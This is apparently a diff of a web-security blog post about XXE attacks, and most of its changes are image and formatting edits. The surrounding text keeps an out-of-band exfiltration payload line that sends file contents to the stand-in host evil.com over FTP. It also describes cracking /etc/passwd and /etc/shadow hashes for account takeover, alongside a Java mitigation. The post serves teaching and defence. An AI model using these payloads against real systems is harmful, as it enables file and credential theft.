@@ -12,7 +12,6 @@ Here in the blog post, we will learn about another type of attack, XML External 
 
 {% include series-nav.html %}
 
-
 ### Type of XXE attacks:
 
 The XXE attack vulnerability involves some API endpoint, which either takes an XML payload, or the non-XML payload is processed to generate an intermediate XML payload, which is then later processed by an XML parser, maybe by some internal legacy application.
@@ -26,13 +25,15 @@ Example of such XML payload:
 
 ##### Direct XXE attack:
 
-![Direct XXE attack: XXE direct](/images/web-security/XXE_direct.png)
-
+![Direct XXE attack: XXE direct](/images/web-security/XXE_direct.png){: .light }
+![Direct XXE attack: XXE direct](/images/web-security/XXE_direct-dark.png){: .dark }
+_Direct XXE attack: XXE direct_
 
 ##### Direct XXE attack:
 
-![Direct XXE attack: XXE indirect](/images/web-security/XXE_indirect.png)
-
+![Direct XXE attack: XXE indirect](/images/web-security/XXE_indirect.png){: .light }
+![Direct XXE attack: XXE indirect](/images/web-security/XXE_indirect-dark.png){: .dark }
+_Direct XXE attack: XXE indirect_
 
 ##### Out-of-Band Data Exfiltration:
 Certain times, web applications rely on XML parsers for some intermediate operations. In those cases, the output of the internal operation might not be visible directly as a response. In those cases, an out-of-band data exfiltration technique can be used. This technique is used by attackers to redirect the output by transmitting it over some alternative communication channel. For example, some XXE payload can be created that would try to transmit information from the system to a specific FTP server like the following:
@@ -42,11 +43,9 @@ Certain times, web applications rely on XML parsers for some intermediate operat
  <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://evil.com/%d;'>">
 ```
 
-
 ### How to perform account takeover with XXE:
 
 The /etc/passwd file in the Linux file system contains user and group-related information. It also contains the location to check for the hashed password for that user. The second column generally contains the password storage location (x denotes the default password storage location at /etc/shadow). Once the hashed password is obtained, there are several third-party password cracking tools like "John the Ripper" or "Hashcat" to generate plain-text passwords from hashed passwords. There are several tools available like "unshadow" which formats the captured file-system contents so that they can be fed to these password-cracking tools.
-
 
 ### Mitigation:
 
@@ -55,7 +54,6 @@ Disable external entities in XML parser: Typically it's just a single line of co
 ```java
     factory.setFeature("https://apache.org/xml/features/disallow-doctype-decl", true)
 ```
-
 
 ### References
 1. Web Application Security by Andrew Hoffman
